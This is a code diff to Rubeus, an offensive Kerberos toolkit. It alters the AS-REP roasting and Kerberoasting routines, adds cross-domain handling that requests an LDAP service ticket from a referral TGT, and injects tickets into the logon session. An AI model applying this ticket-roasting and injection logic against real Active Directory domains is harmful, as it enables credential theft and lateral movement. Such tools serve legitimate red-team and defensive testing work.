@@ -178,7 +178,7 @@ namespace Rubeus
             // check the response value
             int responseTag = responseAsn.TagValue;
 
-            if (responseTag == 11)
+            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
             {
                 Console.WriteLine("[+] AS-REQ w/o preauth successful!");
 
@@ -235,7 +235,7 @@ namespace Rubeus
                     Console.WriteLine();
                 }
             }
-            else if (responseTag == 30)
+            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
             {
                 // parse the response to an KRB-ERROR
                 KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
@@ -334,9 +334,28 @@ namespace Rubeus
                     }
                 }
 
+                // inject ticket for LDAP search if supplied
                 if (TGT != null)
                 {
-                    byte[] kirbiBytes = TGT.Encode().Encode();
+                    byte[] kirbiBytes = null;
+                    string ticketDomain = TGT.enc_part.ticket_info[0].prealm;
+                    // referral TGT is in use, we need a service ticket for LDAP on the DC to perform the domain searcher
+                    if (ticketDomain != domain)
+                    {
+                        string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
+                        Ticket ticket = TGT.tickets[0];
+                        byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
+                        Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
+
+                        // request a service tickt for LDAP on the target DC
+                        kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, string.Format("ldap/{0}", dc), etype, null, false, dc, false, enterprise, false);
+
+                    }
+                    // otherwise inject the TGT to perform the domain searcher
+                    else
+                    {
+                        kirbiBytes = TGT.Encode().Encode();
+                    }
                     LSA.ImportTicket(kirbiBytes, new LUID());
                 }
 
@@ -553,7 +572,7 @@ namespace Rubeus
                                 Console.WriteLine("[*] Supported ETypes       : {0}", supportedETypes);
                             }
 
-                            if (!String.IsNullOrEmpty(domain))
+                            if ((!String.IsNullOrEmpty(domain)) && (TGT == null))
                             {
                                 servicePrincipalName = String.Format("{0}@{1}", servicePrincipalName, domain);
                             }
@@ -775,8 +794,16 @@ namespace Rubeus
             byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
 
-            // request the new service tickt
-            byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, true);
+            // request the new service ticket
+            byte[] tgsBytes = null;
+            if (domain != userDomain)
+            {
+                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false);
+            }
+            else
+            {
+                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, true);
+            }
 
             if (tgsBytes != null)
             {
